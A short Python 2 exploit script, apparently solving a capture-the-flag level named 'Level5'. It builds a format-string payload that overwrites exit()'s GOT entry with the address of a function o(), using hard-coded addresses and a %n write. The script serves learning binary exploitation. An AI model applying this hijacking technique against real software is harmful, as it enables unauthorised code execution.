#!/usr/bin/env python2

import struct
import sys

# Level5 - GOT Overwrite Exploit
# Overwrite exit() GOT entry to redirect to o() function

# Key addresses from analysis:
o_function = 0x080484a4      # Function o() address (from GDB)
exit_got = 0x08049838        # exit() GOT address (from readelf)
STACK_POSITION = 4           # Stack position where our input appears

# Create the payload:
payload = struct.pack('<L', exit_got)    # 4 bytes: target GOT address
remaining = o_function - 4               # 134513828 - 4 = 134513824 chars  
payload += "%" + str(remaining) + "c"    # Width specifier for large number
payload += "%" + str(STACK_POSITION) + "$n"  # Write to position 4

print payload